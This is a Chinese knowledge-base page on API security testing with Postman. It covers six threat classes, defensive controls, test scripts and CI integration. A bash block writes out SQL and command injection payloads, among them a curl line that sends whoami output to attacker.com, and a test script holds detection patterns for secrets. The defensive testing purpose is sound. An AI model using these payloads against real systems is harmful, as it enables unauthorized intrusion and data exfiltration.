---
title: "API 安全威胁与防护实践"
parent: "Postman 接口测试实战知识库"
nav_order: 9
---

# API 安全威胁与防护实践

## 一句话定义
API 暴露面大、自动化易攻击；核心威胁：**注入/认证缺陷/明文传输/敏感数据泄露/DoS/配置错误**；把防护手段写成 **Postman 安全测试集合**，每次改动自动回归，比事后救火便宜得多。

## 核心架构 / 工作原理

```mermaid
graph TD
  A[API 安全六大威胁] --> B[注入攻击 Injection]
  B --> B1[SQL/命令/代码/LDAP/NoSQL 注入]
  B --> B2[防护: 参数化查询/ORM/输入校验/最小权限 DB 账号/ WAF]
  B --> B3[测试: Payload 列表(' OR 1=1-- / ;id / ${7*7}) -> 断言拦截/不回显数据]
  
  A --> C[认证授权缺陷 Broken Auth]
  C --> C1[弱密码/凭证填充/Token 不过期/JWT 弱签名/会话固定/越权]
  C --> C2[防护: bcrypt/argon2 哈希 / 短时 Access Token+轮换 Refresh / MFA / RBAC/ABAC]
  C --> C3[测试: 爆破/枚举/Token 篡改/IDOR/横向越权 -> 断言 401/403/不泄露他人数据]
  
  A --> D[中间人 MITM / 明文传输]
  D --> D1[HTTP 明文/证书校验缺失/降级攻击]
  D --> D2[防护: 全链路 TLS 1.2+ / HSTS / 证书绑定 / mTLS]
  D --> D3[测试: 尝试 HTTP 访问 -> 301/403; 拿自签证书调 -> 拒绝; 降级 -> 拒绝]
  
  A --> E[敏感数据泄露 Sensitive Data Exposure]
  E --> E1[响应含 PII/密钥/Token/堆栈/调试信息/日志]
  E --> E2[防护: 响应脱敏/字段级加密/最小返回集/错误信息通用化/审计日志]
  E --> E3[测试: 遍历端点 -> 断言无信用卡/身份证/密码/私钥/内网 IP/堆栈]
  
  A --> F[拒绝服务 DoS / 资源耗尽]
  F --> F1[大 Payload/深度嵌套/慢速攻击/连接耗尽/数据库锁表]
  F --> F2[防护: 请求体大小限制/超时/限流/熔断/查询深度/复杂度限制/异步削峰]
  F --> F3[测试: 10MB Body/递归 Query/并发 1000 -> 断言 413/429/超时/不崩]
  
  A --> G[安全配置错误 Security Misconfiguration]
  G --> G1[默认账号/开放 CORS/多余 Header/调试端口/目录列出/错误页泄露版本]
  G --> G2[防护: 禁用默认/最小权限/安全头(CSP/HSTS/X-Frame/Referrer-Policy)/最小化错误页]
  G --> G3[测试: 扫描头/端点/方法/参数 -> 断言安全头全/无多余方法/无目录列出]
```

| 威胁类别 | 核心防护原则 | Postman 安全测试集合关键用例 |
|----------|--------------|------------------------------|
| **注入** | 输入即不可信、参数化查询、最小权限 | 所有入口注入 Payload 矩阵 → 断言无回显数据/报错/延时 |
| **认证授权** | 零信任、最小权限、短时 Token、MFA | 弱密/爆破/枚举/Token 篡改/IDOR/垂直越权 → 断言 401/403 |
| **传输加密** | 全链路 TLS、证书校验、HSTS | HTTP 访问/自签证书/降级 → 断言拒绝/重定向 HTTPS |
| **数据泄露** | 最小返回、脱敏、错误通用化 | 全端点响应扫敏感模式 → 断言无匹配 |
| **DoS** | 限流、熔断、资源配额、异步 | 大 Body/深 Query/高并发 → 断言 413/429/超时/可用性 |
| **配置错误** | 最小化、安全头、版本隐藏 | 安全头检查/CORS/方法/目录/错误页 → 断言合规 |

## 快速上手步骤

1. **建安全测试集合 `API Security Tests`**：
   - 文件夹 `01-Injection` → 每注入类型一请求(SQLi/命令注入/LDAP/NoSQL) → Tests 断言无数据泄露
   - 文件夹 `02-BrokenAuth` → 弱密码/枚举/Token篡改/IDOR/越权 → 断言 401/403
   - 文件夹 `03-Transport` → HTTP 访问/自签证书/TLS 版本 → 断言拒绝
   - 文件夹 `04-DataExposure` → 遍历所有 GET 端点 → 正则扫敏感模式 → 断言无匹配
   - 文件夹 `05-DoS` → 大 Body/深度 Query/高并发 → 断言 413/429/熔断
   - 文件夹 `06-Misconfig` → 安全头/CORS/方法/目录/错误页 → 断言合规
2. **关键测试脚本片段**：
   ```javascript
   // 敏感数据扫描 (放在通用 Test 脚本或 Collection 级 Pre-request)
   const sensitivePatterns = [
     /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/,  // 信用卡
     /\b\d{3}-\d{2}-\d{4}\b/,                        // SSN
     /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z]{2,}\b/, // 邮箱(可选)
     /-----BEGIN (RSA|EC|PRIVATE) KEY-----/,         // 私钥
     /password|secret|token|api[_-]?key/i            // 密钥关键字
   ];
   
   pm.test("No sensitive data leaked", () => {
     const body = JSON.stringify(pm.response.json());
     for (const regex of sensitivePatterns) {
       pm.expect(body).to.not.match(regex, `Matched sensitive pattern: ${regex}`);
     }
   });
   
   // 安全头检查
   pm.test("Security headers present", () => {
     const headers = pm.response.headers;
     pm.expect(headers.get('X-Content-Type-Options')).to.equal('nosniff');
     pm.expect(headers.get('X-Frame-Options')).to.satisfy(v => ['DENY','SAMEORIGIN'].includes(v));
     pm.expect(headers.get('Content-Security-Policy')).to.exist;
     pm.expect(headers.get('Strict-Transport-Security')).to.exist;
     pm.expect(headers.get('Referrer-Policy')).to.exist;
   });
   
   // 注入测试断言 (响应不应包含数据库报错/数据)
   pm.test("No SQL error leaked", () => {
     const body = pm.response.text();
     pm.expect(body).to.not.match(/SQL syntax|ORA-\d{5}|PostgreSQL.*ERROR|mysql_fetch_array/i);
   });
   ```
3. **CI/CD 接入**：
   - `newman run security-tests.json -e env.json --reporters cli,junit --reporter-junit-export results.xml`
   - GitHub Actions 发布 JUnit 报告 → PR 检查失败阻断合并
4. **定时监控**：
   - Monitor 跑安全集合 → 失败告警 Slack/PagerDuty

```bash
# 批量生成注入 Payload 文件
cat > sqli_payloads.txt <<'EOF'
' OR 1=1--
' UNION SELECT null,version(),null--
'; WAITFOR DELAY '0:0:5'--
1; SELECT pg_sleep(5)--
EOF

cat > cmd_payloads.txt <<'EOF'
;id
|id
$(id)
`id`
; curl http://attacker.com/$(whoami)
EOF
```

## 踩坑避坑指南

| 场景 | 问题现象 | 原因 | 解决/最佳实践 |
|------|----------|------|---------------|
| 内网接口不上 HTTPS | "内网安全" | 内网也可能被横向渗透/嗅探 | **全链路 TLS**，内网用 mTLS/Service Mesh |
| JWT 不设过期/不轮换 | 拿到即永久有效 | 图省事 | **Access Token 15-30min** + **Refresh Token 轮换+绑定设备/指纹** |
| 限流只防外网 | 内部批处理/爬虫打挂服务 | 信任内部流量 | **全链路限流**：网关/网格/应用层分层限流 |
| 错误页返回堆栈/版本 | 攻击者获知框架/版本/路径 | 生产环境开启 Debug/默认错误页 | **生产统一错误页**，只返回 `trace_id`，详情进日志系统 |
| CORS `Access-Control-Allow-Orient: *` + `Allow-Credentials: true` | 任意域可带 Cookie 读数据 | 配置粗心 | **禁止同时开启**；ACAO 必须指定域名；ACAC:true 仅配受信域 |

## 替代方案对比

| 维度 | Postman 安全集合 | 专用 DAST (OWASP ZAP/Burp) | SAST (SonarQube/CodeQL) | 运行时保护 (WAF/RASP) |
|------|------------------|---------------------------|------------------------|----------------------|
| 覆盖深度 | 业务逻辑/契约/配置 | 爬虫+主动扫描/规则库 | 源码/字节码模式匹配 | 流量特征/行为分析 |
| 业务上下文 | ✅ 懂业务流/数据 | ⚠️ 需配置上下文 | ❌ 无运行时上下文 | ⚠️ 运行时可见但无业务语义 |
| 误报率 | 低(人工编写) | 中(规则匹配) | 中(模式匹配) | 低(行为基线) |
| CI 集成 | ✅ Newman 原生 | ✅ CLI/API | ✅ 原生 | ⚠️ 需部署 |
| 适合阶段 | 功能/回归/契约/部署前 | 专项渗透/上线前 | 编码期/MR 阶段 | 运行时 0-day 防护 |

---

> 参考来源：*Mastering Postman, Second Edition*（本文为原创讲解，非转载原文）

*下一篇：[OAuth 2.1 实战：PKCE 与令牌安全](10-oauth2.1实战pkce与令牌安全.md)*